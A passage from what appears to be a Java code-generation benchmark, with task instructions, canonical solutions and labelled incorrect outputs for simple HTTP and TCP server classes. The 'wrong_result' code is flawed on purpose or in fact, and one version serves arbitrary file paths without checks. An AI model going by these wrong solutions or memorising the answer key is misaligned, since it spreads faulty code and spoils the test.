ByteArrayInputStream(bodyBytes);\n            handle(method, path, headers, queries, bodyInputStream, output);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public abstract void handle(String method, String path, HashMap<String, String> headers, Map<String, String> queries, InputStream input, OutputStream response);\n\n    public Map<String, String> parsePath(String path) {\n        Map<String, String> queries = new HashMap<>();\n        int queryStart = path.indexOf('?');\n        if (queryStart != -1) {\n            String queryString = path.substring(queryStart + 1);\n            String[] pairs = queryString.split(\"&\");\n            for (String pair : pairs) {\n                int eqIndex = pair.indexOf('=');\n                if (eqIndex != -1) {\n                    String key = pair.substring(0, eqIndex);\n                    String value = pair.substring(eqIndex + 1);\n                    queries.put(key, value);\n                }\n            }\n        }\n        return queries;\n    }\n}"
  },
  {
    "Task_id": 551,
    "Instruction": "Task Description: Create a Java class that implements a simple HTTP server capable of handling GET requests, serving both static files and dynamically generated class files through Javassist's ClassPool mechanism.\n\nClass Description: The Webserver class is a multi-threaded HTTP server that listens for incoming connections on a specified port. It can serve both static files from the filesystem and dynamically generated bytecode through Javassist's class manipulation capabilities. The server follows basic HTTP/1.0 protocol and handles each client connection in a separate thread.\n\nAttributes:\n- socket: ServerSocket - The main server socket listening for incoming connections\n- classPool: ClassPool - Javassist class pool for dynamic class generation\n- translator: Translator - Optional translator for class manipulation\n- endofline: byte[] - Constant for HTTP line endings (CRLF)\n\nMethods:\n- Webserver(int port) -> void - Constructor that initializes the server socket on the specified port\n- setClassPool(ClassPool loader) -> void - Sets the Javassist ClassPool for dynamic class generation\n- addTranslator(ClassPool cp, Translator t) -> void - Configures both ClassPool and Translator for advanced class manipulation\n- end() -> void - Closes the server socket and stops the server\n- run() -> void - Main server loop that accepts connections and spawns service threads\n- process(Socket clnt) -> void - Processes an individual client connection (handles HTTP protocol)\n- readLine(InputStream in) -> String - Reads a line of input from the client\n- skipLine(InputStream in) -> int - Skips a line of input from the client\n- doReply(InputStream in, OutputStream out, String cmd) -> void - Processes the HTTP request and generates appropriate response\n- letUsersSendClassfile(OutputStream out, String filename, int length) -> boolean - Handles dynamic class file generation and transmission\n- sendHeader(OutputStream out, long dataLength, int filetype) -> void - Sends HTTP response headers\n- replyError(OutputStream out, BadHttpRequest e) -> void - Sends HTTP error response",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Date;\n\npublic class Webserver {\n    private ServerSocket socket;\n    private ClassPool classPool;\n    protected Translator translator;\n\n    private final static byte[] endofline = { 0x0d, 0x0a };\n\n    public Webserver(int port) throws IOException {\n        socket = new ServerSocket(port);\n        classPool = null;\n        translator = null;\n    }\n\n    public void setClassPool(ClassPool loader) {\n        classPool = loader;\n    }\n\n    public void addTranslator(ClassPool cp, Translator t)\n        throws NotFoundException, CannotCompileException\n    {\n        classPool = cp;\n        translator = t;\n        t.start(classPool);\n    }\n\n    public void end() throws IOException {\n        socket.close();\n    }\n\n    public void run() {\n        System.err.println(\"ready to service...\");\n        for (;;)\n            try {\n                ServiceThread th = new ServiceThread(this, socket.accept());\n                th.start();\n            }\n            catch (IOException e) {\n                System.out.println(e.toString());\n            }\n    }\n\n    final void process(Socket clnt) throws IOException {\n        InputStream in = new BufferedInputStream(clnt.getInputStream());\n        String cmd = readLine(in);\n        while (skipLine(in) > 0){\n        }\n\n        OutputStream out = new BufferedOutputStream(clnt.getOutputStream());\n        try {\n            doReply(in, out, cmd);\n        }\n        catch (BadHttpRequest e) {\n            replyError(out, e);\n        }\n\n        out.flush();\n        in.close();\n        out.close();\n        clnt.close();\n    }\n\n    private String readLine(InputStream in) throws IOException {\n        StringBuffer buf = new StringBuffer();\n        int c;\n        while ((c = in.read()) >= 0 && c != 0x0d)\n            buf.append((char)c);\n\n        in.read();      /* skip 0x0a (LF) */\n        return buf.toString();\n    }\n\n    private int skipLine(InputStream in) throws IOException {\n        int c;\n        int len = 0;\n        while ((c = in.read()) >= 0 && c != 0x0d)\n            ++len;\n\n        in.read();      /* skip 0x0a (LF) */\n        return len;\n    }\n\n    public void doReply(InputStream in, OutputStream out, String cmd)\n        throws IOException, BadHttpRequest\n    {\n        int len;\n        int fileType;\n        String filename, urlName;\n\n        if (cmd.startsWith(\"GET /\"))\n            filename = urlName = cmd.substring(5, cmd.indexOf(' ', 5));\n        else\n            throw new BadHttpRequest();\n\n        len = filename.length();\n        if (letUsersSendClassfile(out, filename, len))\n            return;\n\n        checkFilename(filename, len);\n        File file = new File(filename);\n        if (file.canRead()) {\n            sendHeader(out, file.length(), typeClass);\n            FileInputStream fin = new FileInputStream(file);\n            byte[] filebuffer = new byte[4096];\n            for (;;) {\n                len = fin.read(filebuffer);\n                if (len <= 0)\n                    break;\n                out.write(filebuffer, 0, len);\n            }\n\n            fin.close();\n            return;\n        }\n\n        throw new BadHttpRequest();\n    }\n\n    private boolean letUsersSendClassfile(OutputStream out,\n                                          String filename, int length)\n        throws IOException, BadHttpRequest\n    {\n        if (classPool == null)\n            return false;\n\n        byte[] classfile;\n        String classname\n            = filename.substring(0, length - 6).replace('/', '.');\n        try {\n            if (translator != null)\n                translator.onLoad(classPool, classname);\n\n            CtClass c = classPool.get(classname);\n            classfile = c.toBytecode();\n        }\n        catch (Exception e) {\n            throw new BadHttpRequest(e);\n        }\n\n        sendHeader(out, classfile.length, typeClass);\n        out.write(classfile);\n        return true;\n    }\n\n    private void sendHeader(OutputStream out, long dataLength, int filetype)\n        throws IOException\n    {\n        out.write(\"HTTP/1.0 200 OK\".getBytes());\n        out.write(endofline);\n        out.write(\"Content-Length: \".getBytes());\n        out.write(Long.toString(dataLength).getBytes());\n        out.write(endofline);\n        out.write(\"Content-Type: application/octet-stream\".getBytes());\n        out.write(endofline);\n        out.write(endofline);\n    }\n\n    private void replyError(OutputStream out, BadHttpRequest e)\n        throws IOException\n    {\n        out.write(\"HTTP/1.0 400 Bad Request\".getBytes());\n        out.write(endofline);\n        out.write(endofline);\n        out.write(\"<H1>Bad Request</H1>\".getBytes());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class Webserver {\n    private ServerSocket socket;\n    private ClassPool classPool;\n    private Translator translator;\n    private byte[] endofline = \"\\r\\n\".getBytes();\n\n    public Webserver(int port) {\n        try {\n            socket = new ServerSocket(port);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Cannot open port \" + port, e);\n        }\n    }\n\n    public void setClassPool(ClassPool loader) {\n        this.classPool = loader;\n    }\n\n    public void addTranslator(ClassPool cp, Translator t) {\n        this.classPool = cp;\n        this.translator = t;\n    }\n\n    public void end() {\n        try {\n            socket.close();\n        } catch (IOException e) {\n            // Handle exception\n        }\n    }\n\n    public void run() {\n        while (true) {\n            try {\n                Socket clnt = socket.accept();\n                new Thread(() -> process(clnt)).start();\n            } catch (IOException e) {\n                // Handle exception\n            }\n        }\n    }\n\n    public void process(Socket clnt) {\n        try (InputStream in = clnt.getInputStream(); OutputStream out = clnt.getOutputStream()) {\n            String requestLine = readLine(in);\n            if (requestLine == null) {\n                return;\n            }\n            String[] parts = requestLine.split(\" \");\n            if (parts.length < 2 || !parts[0].equals(\"GET\")) {\n                replyError(out, new BadHttpRequest(\"Invalid method\"));\n                return;\n            }\n            String path = parts[1];\n            skipHeaders(in);\n            doReply(in, out, parts[0]);\n        } catch (IOException e) {\n            // Handle exception\n        }\n    }\n\n    private String readLine(InputStream in) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int c;\n        boolean sawCR = false;\n        while ((c = in.read()) != -1) {\n            if (c == '\\r') {\n                sawCR = true;\n            } else if (c == '\\n') {\n                if (sawCR) {\n                    break;\n                } else {\n                    break;\n                }\n            } else {\n                sb.append((char) c);\n            }\n        }\n        return sb.toString();\n    }\n\n    private int skipLine(InputStream in) throws IOException {\n        int c;\n        while ((c = in.read()) != -1) {\n            if (c == '\\r') {\n                continue;\n            } else if (c == '\\n') {\n                return 0;\n            }\n        }\n        return -1;\n    }\n\n    private void skipHeaders(InputStream in) throws IOException {\n        String line;\n        while ((line = readLine(in)) != null && !line.isEmpty()) {\n            // Skip the header line\n        }\n    }\n\n    private void doReply(InputStream in, OutputStream out, String cmd) throws IOException {\n        String path = cmd.equals(\"GET\") ? extractPath(in) : \"/\";\n        if (isStaticFileRequest(path)) {\n            sendStaticFile(out, path);\n        } else if (isDynamicClassRequest(path)) {\n            letUsersSendClassfile(out, extractFilenameFromPath(path), 0);\n        } else {\n            replyError(out, new BadHttpRequest(\"Invalid request\"));\n        }\n    }\n\n    private String extractPath(InputStream in) throws IOException {\n        String line;\n        while ((line = readLine(in)) != null && !line.isEmpty()) {\n            if (line.startsWith(\"GET\")) {\n                String[] parts = line.split(\" \");\n                if (parts.length >= 2) {\n                    return parts[1];\n                }\n            }\n        }\n        return \"/\";\n    }\n\n    private boolean isStaticFileRequest(String path) {\n        return !path.startsWith(\"/generate/\");\n    }\n\n    private boolean isDynamicClassRequest(String path) {\n        return path.startsWith(\"/generate/\");\n    }\n\n    private String extractFilenameFromPath(String path) {\n        return path.substring(\"/generate/\".length());\n    }\n\n    private void sendStaticFile(OutputStream out, String path) throws IOException {\n        File file = new File(path);\n        if (!file.exists()) {\n            replyError(out, new BadHttpRequest(\"File not found\"));\n            return;\n        }\n        sendHeader(out, file.length(), 1);\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        try (FileInputStream fis = new FileInputStream(file)) {\n            while ((bytesRead = fis.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n        }\n    }\n\n    private void sendHeader(OutputStream out, long dataLength, int filetype) throws IOException {\n        String contentType;\n        switch (filetype) {\n            case 0:\n                contentType = \"text/html\";\n                break;\n            case 1:\n                contentType = \"text/plain\";\n                break;\n            case 2:\n                contentType = \"application/octet-stream\";\n                break;\n            default:\n                contentType = \"application/octet-stream\";\n        }\n        String header = \"HTTP/1.0 200 OK\\r\\nContent-Type: \" + contentType + \"\\r\\nContent-Length: \" + dataLength + \"\\r\\n\\r\\n\";\n        out.write(header.getBytes());\n        out.flush();\n    }\n\n    private void replyError(OutputStream out, BadHttpRequest e) throws IOException {\n        String message = \"HTTP/1.0 400 Bad Request\\r\\nContent-Type: text/plain\\r\\nContent-Length: \" + e.getMessage().length() + \"\\r\\n\\r\\n\" + e.getMessage();\n        out.write(message.getBytes());\n        out.flush();\n    }\n\n    public boolean letUsersSendClassfile(OutputStream out, String filename, int length) {\n        try {\n            ClassPool pool = getClassPool();\n            CtClass clazz = pool.makeClass(filename);\n            if (translator != null) {\n                translator.translate(clazz);\n            }\n            byte[] bytecode = clazz.toBytecode();\n            sendHeader(out, bytecode.length, 2);\n            out.write(bytecode);\n            out.flush();\n            return true;\n        } catch (Exception e) {\n            replyError(out, new BadHttpRequest(e.getMessage()));\n            return false;\n        }\n    }\n}"
  },
  {
    "Task_id": 552,
    "Instruction": "Task Description: Implement a basic HTTP server in Java using ServerSocket that handles GET requests and responds with appropriate HTTP status codes.\n\nClass Description: The Webserver class represents a simple HTTP server that listens on a specified port, accepts client connections, processes HTTP GET requests, and sends responses. It uses multi-threading to handle multiple client connections simultaneously.\n\nAttributes:\n- socket: ServerSocket - The server socket that listens for incoming client connections\n\nMethods:\n- Webserver(int port) -> void - Constructor that initializes the server socket on the specified port\n- run() -> void - Starts the server, continuously accepting client connections and spawning ServiceThreads to handle them\n- process(Socket clnt) -> void - Processes a client connection by reading the request and sending a response\n- readLine(InputStream in) -> String - Reads a line of text from the input stream until CRLF is encountered\n- skipLine(InputStream in) -> int - Skips a line in the input stream and returns its length\n- doReply(InputStream in, OutputStream out, String cmd) -> void - Processes the HTTP command and generates an appropriate response\n- replyError(OutputStream out, Exception e) -> void - Sends an HTTP error response to the client\n\nAdditional Class:\nServiceThread: A helper class that extends Thread to handle individual client connections in separate threads\n\nServiceThread Attributes:\n- web: Webserver - Reference to the main server instance\n- sock: Socket - The client socket connection\n\nServiceThread Methods:\n- ServiceThread(Webserver w, Socket s) -> void - Constructor that initializes the thread with server and client socket references\n- run() -> void - The thread's main execution method that processes the client request",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class Webserver {\n    private ServerSocket socket;\n\n    public Webserver(int port) throws IOException {\n        socket = new ServerSocket(port);\n    }\n\n    public void run() {\n        System.err.println(\"ready to service...\");\n        for (;;)\n            try {\n                ServiceThread th = new ServiceThread(this, socket.accept());\n                th.start();\n            }\n            catch (IOException e) {\n                System.out.println(e.toString());\n            }\n    }\n\n    final void process(Socket clnt) throws IOException {\n        InputStream in = new BufferedInputStream(clnt.getInputStream());\n        OutputStream out = new BufferedOutputStream(clnt.getOutputStream());\n        try {\n            String cmd = readLine(in);\n            while (skipLine(in) > 0) {}\n            doReply(in, out, cmd);\n        }\n        catch (Exception e) {\n            replyError(out, e);\n        }\n        finally {\n            out.flush();\n            in.close();\n            out.close();\n            clnt.close();\n        }\n    }\n\n    private String readLine(InputStream in) throws IOException {\n        StringBuilder buf = new StringBuilder();\n        int c;\n        while ((c = in.read()) >= 0 && c != 0x0d)\n            buf.append((char)c);\n        in.read();\n        return buf.toString();\n    }\n\n    private int skipLine(InputStream in) throws IOException {\n        int c;\n        int len = 0;\n        while ((c = in.read()) >= 0 && c != 0x0d)\n            ++len;\n        in.read();\n        return len;\n    }\n\n    public void doReply(InputStream in, OutputStream out, String cmd) throws IOException {\n        if (cmd.startsWith(\"GET /\")) {\n            String filename = cmd.substring(5, cmd.indexOf(' ', 5));\n            out.write(\"HTTP/1.0 200 OK\\r\\n\\r\\n\".getBytes());\n        }\n        else\n            throw new IOException(\"Bad Request\");\n    }\n\n    private void replyError(OutputStream out, Exception e) throws IOException {\n        out.write(\"HTTP/1.0 400 Bad Request\\r\\n\\r\\n\".getBytes());\n        out.write(\"<H1>Bad Request</H1>\".getBytes());\n    }\n}\n\nclass ServiceThread extends Thread {\n    Webserver web;\n    Socket sock;\n\n    public ServiceThread(Webserver w, Socket s) {\n        web = w;\n        sock = s;\n    }\n\n    @Override\n    public void run() {\n        try {\n            web.process(sock);\n        }\n        catch (IOException e) {\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class Webserver {\n    private ServerSocket socket;\n\n    public Webserver(int port) {\n        try {\n            socket = new ServerSocket(port);\n        } catch (IOException e) {\n            replyError(System.out, e);\n            System.exit(1);\n        }\n    }\n\n    public void run() {\n        while (true) {\n            try {\n                Socket clnt = socket.accept();\n                ServiceThread st = new ServiceThread(this, clnt);\n                st.start();\n            } catch (IOException e) {\n                replyError(System.out, e);\n            }\n        }\n    }\n\n    private void process(Socket clnt) {\n        try {\n            InputStream in = clnt.getInputStream();\n            OutputStream out = clnt.getOutputStream();\n            String requestLine = readLine(in);\n            String[] parts = requestLine.split(\" \");\n            String method = parts[0];\n            String path = parts[1];\n            String version = parts[2];\n\n            if (!method.equals(\"GET\")) {\n                replyError(out, new IllegalArgumentException(\"Unsupported method: \" + method));\n            } else {\n                doReply(in, out, method, path);\n            }\n        } catch (Exception e) {\n            replyError(System.out, e);\n        }\n    }\n\n    private String readLine(InputStream in) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int c;\n        while ((c = in.read()) != -1) {\n            if (c == '\\r') {\n                if (in.read() == '\\n') {\n                    break;\n                }\n            } else if (c == '\\n') {\n                break;\n            }\n            sb.append((char) c);\n        }\n        return sb.toString();\n    }\n\n    private int skipLine(InputStream in) throws IOException {\n        int len = 0;\n        int c;\n        while ((c = in.read()) != -1) {\n            len++;\n            if (c == '\\r' && in.read() == '\\n') {\n                break;\n            }\n        }\n        return len;\n    }\n\n    private void doReply(InputStream in, OutputStream out, String cmd, String path) throws IOException {\n        if (cmd.equals(\"GET\")) {\n            if (\"/\".equals(path)) {\n                out.write(\"HTTP/1.1 200 OK\\r\\n\".getBytes());\n                out.write(\"Content-Type: text/plain\\r\\n\".getBytes());\n                out.write(\"Content-Length: 13\\r\\n\\r\\n\".getBytes());\n                out.write(\"Hello, World!\\r\\n\".getBytes());\n            } else {\n                out.write(\"HTTP/1.1 404 Not Found\\r\\n\".getBytes());\n                out.write(\"Content-Length: 0\\r\\n\\r\\n\".getBytes());\n            }\n        } else {\n            out.write(\"HTTP/1.1 400 Bad Request\\r\\n\".getBytes());\n            out.write(\"Content-Length: 0\\r\\n\\r\\n\".getBytes());\n        }\n    }\n\n    private void replyError(OutputStream out, Exception e) throws IOException {\n        out.write(\"HTTP/1.1 500 Internal Server Error\\r\\n\".getBytes());\n        out.write(\"Content-Length: 0\\r\\n\\r\\n\".getBytes());\n    }\n\n    public static class ServiceThread extends Thread {\n        private Webserver web;\n        private Socket sock;\n\n        public ServiceThread(Webserver w, Socket s) {\n            web = w;\n            sock = s;\n        }\n\n        public void run() {\n            try {\n                web.process(sock);\n            } catch (Exception e) {\n                web.replyError(sock.getOutputStream(), e);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 553,
    "Instruction": "Task Description: Create a TCP server class that listens for incoming client connections, handles each client connection in a separate thread, and processes incoming data from clients.\n\nClass Description: TCPServer is a Java class that implements a basic TCP server using ServerSocket. It listens on a specified port for incoming client connections, creates a new thread for each connected client, and reads UTF-encoded messages from clients. The server maintains a running state and properly closes resources when finished.\n\nAttributes:\n- serverSocket: ServerSocket - The server socket that listens for incoming connections\n- started: boolean - Flag indicating whether the server is running\n\nMethods:\n- start(int port) -> void - Starts the server on the specified port, begins listening for connections, and creates new threads for each client\n- ClientHandler(Socket socket) -> void - Constructor for the inner client handler class (takes a client socket as parameter)\n- run() -> void - The thread's main execution method that reads data from the client (inherited from Thread)",
    "Canonical_solution": "import java.io.DataInputStream;\nimport java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class TCPServer {\n    private ServerSocket serverSocket;\n    private boolean started;\n\n    public void start(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n        started = true;\n        System.out.println(\"Server started\");\n\n        try {\n            while (started) {\n                Socket clientSocket = serverSocket.accept();\n                System.out.println(\"A client connected!\");\n                new ClientHandler(clientSocket).start();\n            }\n        } finally {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n        }\n    }\n\n    private class ClientHandler extends Thread {\n        private Socket socket;\n        private DataInputStream inputStream;\n\n        public ClientHandler(Socket socket) throws IOException {\n            this.socket = socket;\n            this.inputStream = new DataInputStream(socket.getInputStream());\n        }\n\n        @Override\n        public void run() {\n            try {\n                System.out.println(inputStream.readUTF());\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    if (inputStream != null) {\n                        inputStream.close();\n                    }\n                    if (socket != null) {\n                        socket.close();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class TCPServer {\n    private ServerSocket serverSocket;\n    private boolean started;\n\n    public void start(int port) {\n        try {\n            serverSocket = new ServerSocket(port);\n            started = true;\n            while (started) {\n                Socket clientSocket = serverSocket.accept();\n                ClientHandler handler = new ClientHandler(clientSocket);\n                handler.start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (serverSocket != null) {\n                try {\n                    serverSocket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private class ClientHandler extends Thread {\n        private Socket socket;\n\n        public ClientHandler(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            try {\n                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    System.out.println(\"Received: \" + inputLine);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 555,
    "Instruction": "Task Description: Create a TCP server class that handles multiple types of client requests through socket communication, supporting operations like content updates, progress tracking, and layout management.\n\nClass Description: LinkServer is a TCP server implementation that listens on a specified port for incoming client connections. It handles different types of requests defined by operation codes, manages client connections in separate threads, and provides bidirectional communication through input/output streams.\n\nAttributes:\n- server: ServerSocket - The main server socket that listens for incoming connections\n- port: int - The port number on which the server listens (default: 9999)\n- UPDATE_CONTENT: int - Constant for content update operation (value: 1)\n- UPDATE_PROGRESS: int - Constant for progress update operation (value: 2)\n- GET_CURRENT_CONTENT: int - Constant for content retrieval operation (value: 3)\n- SET_DRAW_DEBUG: int - Constant for debug mode setting operation (value: 4)\n- GET_LAYOUT_LIST: int - Constant for layout list retrieval operation (value: 5)\n- GET_CURRENT_LAYOUT: int - Constant for current layout retrieval operation (value: 6)\n- UPDATE_LAYOUT_DIMENSIONS: int - Constant for layout dimensions update operation (value: 7)\n\nMethods:\n- LinkServer() -> void - Default constructor initializes server with default port\n- LinkServer(int port) -> void - Constructor that takes a custom port number\n- init() -> void - Initializes the ServerSocket instance\n- start() -> void - Starts the server and begins accepting client connections in a dedicated thread\n- handleRequest(Socket socket) -> void - Handles client requests in a separate thread (Input: client socket)\n- closeConnection(Socket socket) -> void - Closes the client socket connection (Input: client socket to close)",
    "Canonical_solution": "import java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Set;\n\npublic class LinkServer {\n    private ServerSocket server;\n    private int port = 9999;\n\n    final int UPDATE_CONTENT = 1;\n    final int UPDATE_PROGRESS = 2;\n    final int GET_CURRENT_CONTENT = 3;\n    final int SET_DRAW_DEBUG = 4;\n    final int GET_LAYOUT_LIST = 5;\n    final int GET_CURRENT_LAYOUT = 6;\n    final int UPDATE_LAYOUT_DIMENSIONS = 7;\n\n    public LinkServer() {\n        init();\n        start();\n    }\n\n    public LinkServer(int port) {\n        this.port = port;\n        init();\n        start();\n    }\n\n    private void init() {\n        try {\n            server = new ServerSocket(port);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void start() {\n        Thread t = new Thread(() -> {\n            try {\n                while (true) {\n                    Socket client = server.accept();\n                    Thread acceptThread = new Thread(() -> handleRequest(client));\n                    acceptThread.start();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        t.setName(\"Link Debug Thread\");\n        t.start();\n    }\n\n    void handleRequest(Socket socket) {\n        boolean running = true;\n        DataInputStream reader;\n        DataOutputStream writer;\n        try {\n            reader = new DataInputStream(socket.getInputStream());\n            writer = new DataOutputStream(socket.getOutputStream());\n        } catch (IOException e) {\n            e.printStackTrace();\n            return;\n        }\n\n        while (running) {\n            try {\n                int type = reader.readInt();\n                String name = reader.readUTF();\n                switch (type) {\n                    case UPDATE_CONTENT:\n                        String content = reader.readUTF();\n                        break;\n                    case UPDATE_PROGRESS:\n                        float progress = reader.readFloat();\n                        break;\n                    case GET_CURRENT_CONTENT:\n                        content = \"\";\n                        writer.writeUTF(content);\n                        break;\n                    case SET_DRAW_DEBUG:\n                        boolean drawDebug = reader.readBoolean();\n                        break;\n                    case GET_LAYOUT_LIST:\n                        Set<String> list = Set.of();\n                        writer.writeInt(list.size());\n                        for (String layout : list) {\n                            writer.writeUTF(layout);\n                        }\n                        break;\n                    case GET_CURRENT_LAYOUT:\n                        content = \"\";\n                        writer.writeUTF(content);\n                        break;\n                    case UPDATE_LAYOUT_DIMENSIONS:\n                        int width = reader.readInt();\n                        int height = reader.readInt();\n                        break;\n                }\n            } catch (Exception e) {\n                closeConnection(socket);\n                running = false;\n            }\n        }\n    }\n\n    private void closeConnection(Socket socket) {\n        try {\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class LinkServer {\n    private ServerSocket server;\n    private int port;\n    public static final int UPDATE_CONTENT = 1;\n    public static final int UPDATE_PROGRESS = 2;\n    public static final int GET_CURRENT_CONTENT = 3;\n    public static final int SET_DRAW_DEBUG = 4;\n    public static final int GET_LAYOUT_LIST = 5;\n    public static final int GET_CURRENT_LAYOUT = 6;\n    public static final int UPDATE_LAYOUT_DIMENSIONS = 7;\n\n    public LinkServer() {\n        this.port = 9999;\n    }\n\n    public LinkServer(int port) {\n        this.port = port;\n    }\n\n    public void init() {\n        try {\n            server = new ServerSocket(this.port);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        new Thread(() -> {\n            while (true) {\n                try {\n                    Socket clientSocket = server.accept();\n                    new Thread(() -> handleRequest(clientSocket)).start();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }).start();\n    }\n\n    public void handleRequest(Socket socket) {\n        try {\n            ObjectInputStream in = new ObjectInputStream(socket.getInputStream());\n            ObjectOutputStream out = new ObjectOutputStream(socket.getOutputStream());\n            int opCode = in.readInt();\n            switch (opCode) {\n                case UPDATE_CONTENT:\n                    String content = in.readUTF();\n                    // Implement content update logic\n                    out.writeInt(0);\n                    break;\n                case UPDATE_PROGRESS:\n                    int progress = in.readInt();\n                    // Implement progress update logic\n                    out.writeInt(0);\n                    break;\n                case GET_CURRENT_CONTENT:\n                    // Implement content retrieval logic\n                    out.writeUTF(\"default_content\");\n                    out.writeInt(0);\n                    break;\n                case SET_DRAW_DEBUG:\n                    boolean debug = in.readBoolean();\n                    // Implement debug mode setting logic\n                    out.writeInt(0);\n                    break;\n                case GET_LAYOUT_LIST:\n                    // Implement layout list retrieval logic\n                    out.writeObject(new ArrayList<String>());\n                    out.writeInt(0);\n                    break;\n                case GET_CURRENT_LAYOUT:\n                    // Implement current layout retrieval logic\n                    out.writeUTF(\"default_layout\");\n                    out.writeInt(0);\n                    break;\n                case UPDATE_LAYOUT_DIMENSIONS:\n                    int width = in.readInt();\n                    int height = in.readInt();\n                    // Implement layout dimensions update logic\n                    out.writeInt(0);\n                    break;\n                default:\n                    out.writeInt(-1);\n            }\n            out.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void closeConnection(Socket socket) {\n        try {\n            if (socket != null && !socket.isClosed()) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 556,
    "Instruction": "Task Description: Implement a TCP server class in Java that handles multiple client connections concurrently using thread pooling. The server should listen on a specified port, accept incoming connections, and process client requests in separate worker threads.\n\nClass Description: ViewServer is a TCP server implementation that manages incoming client connections using a thread pool. It provides methods to start and stop the server, and processes client requests asynchronously through worker threads.\n\nAttributes:\n- VIEW_SERVER_DEFAULT_PORT: int - Default port number for the server (4939)\n- VIEW_SERVER_MAX_CONNECTIONS: int - Maximum number of concurrent connections (10)\n- mServer: ServerSocket - The server socket instance for accepting connections\n- mPort: int - The port number on which the server listens\n- mThread: Thread - The server's main thread\n- mThreadPool: ExecutorService - Thread pool for handling client connections\n\nMethods:\n- ViewServer(int port) -> None - Constructor that initializes the server with specified port\n- start() -> boolean - Starts the server thread and initializes thread pool, returns true if successful\n- stop() -> boolean - Stops the server thread, shuts down thread pool, and closes server socket, returns true if successful\n- run() -> None - Main server loop that accepts incoming connections and delegates to worker threads\n- ViewServerWorker(Socket client) -> None - Nested class constructor for handling individual client connections\n- run() (in ViewServerWorker) -> None - Processes client request by reading input stream and closing connection",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class ViewServer implements Runnable {\n    private static final int VIEW_SERVER_DEFAULT_PORT = 4939;\n    private static final int VIEW_SERVER_MAX_CONNECTIONS = 10;\n    \n    private ServerSocket mServer;\n    private final int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    private ViewServer(int port) {\n        mPort = port;\n    }\n\n    public boolean start() throws IOException {\n        if (mThread != null) {\n            return false;\n        }\n\n        mThread = new Thread(this, \"Local View Server [port=\" + mPort + \"]\");\n        mThreadPool = Executors.newFixedThreadPool(VIEW_SERVER_MAX_CONNECTIONS);\n        mThread.start();\n        return true;\n    }\n\n    public boolean stop() {\n        if (mThread != null) {\n            mThread.interrupt();\n            if (mThreadPool != null) {\n                try {\n                    mThreadPool.shutdownNow();\n                } catch (SecurityException e) {\n                    // Ignore\n                }\n            }\n\n            mThreadPool = null;\n            mThread = null;\n\n            try {\n                mServer.close();\n                mServer = null;\n                return true;\n            } catch (IOException e) {\n                // Ignore\n            }\n        }\n        return false;\n    }\n\n    public void run() {\n        try {\n            mServer = new ServerSocket(mPort, VIEW_SERVER_MAX_CONNECTIONS, InetAddress.getLocalHost());\n        } catch (Exception e) {\n            // Ignore\n        }\n\n        while (mServer != null && Thread.currentThread() == mThread) {\n            try {\n                Socket client = mServer.accept();\n                if (mThreadPool != null) {\n                    mThreadPool.submit(new ViewServerWorker(client));\n                } else {\n                    try {\n                        client.close();\n                    } catch (IOException e) {\n                        // Ignore\n                    }\n                }\n            } catch (Exception e) {\n                // Ignore\n            }\n        }\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private Socket mClient;\n\n        public ViewServerWorker(Socket client) {\n            mClient = client;\n        